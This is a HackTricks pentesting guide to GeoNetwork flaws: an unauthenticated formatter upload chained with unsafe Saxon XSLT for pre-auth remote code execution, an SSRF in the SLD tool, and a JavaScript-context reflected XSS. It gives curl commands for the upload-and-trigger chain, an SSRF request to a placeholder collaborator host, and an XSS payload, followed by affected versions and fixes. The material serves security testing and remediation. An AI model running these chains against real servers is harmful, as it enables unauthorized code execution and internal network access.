---
title: "GeoNetwork"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/geonetwork.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Overview

GeoNetwork is a Java/Spring geospatial metadata catalogue. Metadata objects are **records** identified by UUID, and public records are intentionally readable without authentication. Most application routes are portal-scoped below `/<portal>/api` (commonly `/srv/api`), while XSLT **formatters** transform records into HTML, text, or XML.[\[1\]](#references)

Useful routes to fingerprint and map are:[\[1\]](#references)

```
GET  /srv/api/records/{uuid}
POST /srv/api/formatters
GET  /srv/api/records/{uuid}/formatters/{formatter}
POST /srv/api/tools/ogc/sld
GET  /srv/eng/catalog.search
```
The application may be deployed below a context path such as `/geonetwork`; preserve that prefix when testing.[\[3\]](#references)

## Formatter upload + unsafe XSLT to pre-auth RCE

### Missing method-level authorization

GeoNetwork protects administrative Spring methods individually with `@PreAuthorize("hasAuthority('UserAdmin')")`. In the vulnerable formatter controller, list, download, update, and delete methods had that annotation, but `addFormatter()` did not. The unprotected `POST /{portal}/api/formatters` accepted multipart parameter `file`, derived the formatter name from the uploaded filename, and installed either a raw `.xsl` as `view.xsl` or a formatter ZIP containing `view.xsl`.[\[1\]](#references)[\[2\]](#references)[\[3\]](#references)

This is a useful white-box audit pattern for Spring applications: compare authorization annotations on **every** mapped method rather than trusting the controller’s administrative purpose. Prioritize create, import, upload, and file-writing methods, then trace whether the written object is later parsed, compiled, included, or executed.[\[1\]](#references)[\[2\]](#references)

### Second-stage interpreter trigger

The vulnerable transformation path created a Saxon transformer without enabling JAXP secure processing and without setting Saxon’s `ALLOW_EXTERNAL_FUNCTIONS` to `false`. Saxon’s option defaults to enabled in the documented configuration, so a loaded stylesheet can reach Java extension functions such as `java.lang.Runtime.exec()` or `java.lang.ProcessBuilder` and run a command as the GeoNetwork service user.[\[1\]](#references)[\[4\]](#references)[\[5\]](#references)

During an authorized test, create a formatter XSLT using the [Saxon Java extension primitive](../../pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html#saxon-reflexive-java-extension-functions). Use a harmless marker, time delay, or controlled callback instead of a destructive command. A raw upload named `htproof.xsl` is installed under formatter name `htproof`; the multipart upload and independent execution trigger are:[\[1\]](#references)[\[2\]](#references)

```
base='https://target/geonetwork'
curl -ik -F 'file=@htproof.xsl;filename=htproof.xsl' \
  "$base/srv/api/formatters"
curl -ik \
  "$base/srv/api/records/PUBLIC_RECORD_UUID/formatters/htproof"
```
Obtain `PUBLIC_RECORD_UUID` from an anonymously visible catalogue result and confirm it with `GET /srv/api/records/{uuid}`. The record only supplies valid XML input; the attacker-selected formatter supplies the executable transformation. Consequently, the file does not need to land in a webroot: **unauthorized formatter creation plus a public formatter-render route is the complete execution chain**.[\[1\]](#references)

## SLD tool SSRF

The vulnerable Styled Layer Descriptor endpoint accepted form field `url` and passed it through `new URI(serverURL)` to `SLDUtil.parseSLD()`. That helper appended `service=WMS`, `request=GetStyles`, `version=1.1.1`, and `layers=<value>` before issuing an HTTP GET, without an allowlist, scheme validation, or private-address restriction.[\[1\]](#references)[\[6\]](#references)[\[7\]](#references)[\[8\]](#references)

A controlled callback can verify the outbound request. Even if later filter or XML processing fails, the network request occurs first:[\[7\]](#references)[\[8\]](#references)

```
curl -ik -X POST 'https://target/geonetwork/srv/api/tools/ogc/sld' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'url=https://COLLABORATOR.example/probe' \
  --data-urlencode 'layers=proof' \
  --data-urlencode 'filters={"filters":[]}'
```
Test loopback, link-local, and internal destinations only when they are in scope. This SSRF is partially non-blind: GeoNetwork reads the response body, parses it as XML, stores the transformed SLD, and returns a URL from which compatible XML output can be downloaded. Non-XML responses still prove reachability but normally fail before content is returned.[\[1\]](#references)[\[6\]](#references)[\[7\]](#references)[\[8\]](#references)

## JavaScript-expression reflected XSS

The public `catalog.search` route placed `uiconfig` directly into the first JavaScript argument of `gnGlobalSettings.init(...)`. When input must remain a syntactically valid argument, the comma operator is useful: `(alert(1),{})` executes the first expression and evaluates to the empty object expected by the surrounding call.[\[1\]](#references)[\[10\]](#references)

```
GET /srv/eng/catalog.search?uiconfig=%28alert%281%29%2C%7B%7D%29 HTTP/1.1
Host: target
```
This pattern generalizes to JavaScript-context injection where closing the script is unnecessary or filtered: use `(SIDE_EFFECT,VALUE_OF_EXPECTED_TYPE)`. In affected GeoNetwork deployments, same-origin script could also read the non-`HttpOnly` `XSRF-TOKEN` cookie and use it in authenticated requests, so impact is not limited to an alert box.[\[1\]](#references)

## Affected versions and remediation

The coordinated advisories identify these fixed branches:[\[3\]](#references)[\[4\]](#references)[\[6\]](#references)[\[10\]](#references)

| Primitive | Affected versions documented by the advisory | Fixed |
|---|---|---|
| Unauthorized formatter upload | `<=4.2.16` and`<=4.4.11` packages (the research traces the regression to the 4.0.6 refactor) | 4.2.17 / 4.4.12 |
| Unsafe formatter XSLT | `<=4.2.16` and`<=4.4.11` | 4.2.17 / 4.4.12 |
| SLD SSRF | 4.0.0–4.2.16 and 4.4.0–4.4.11 | 4.2.17 / 4.4.12 |
| `uiconfig` XSS | 4.4.5–4.4.11 | 4.4.12 |

Upgrade to **4.2.17, 4.4.12, or a later supported release**. As a temporary control for the RCE chain, deny unauthenticated `POST`, `PUT`, and `PATCH` requests to the exact `/geonetwork/srv/api/formatters` route at the reverse proxy; this also disables legitimate formatter administration until patched. Application fixes must both enforce `UserAdmin` on formatter creation and sandbox XSLT with secure processing plus disabled external functions. The SLD SSRF fix removes the server-side WMS-fetch path rather than relying on URL filtering.[\[3\]](#references)[\[4\]](#references)[\[6\]](#references)[\[9\]](#references)

## References
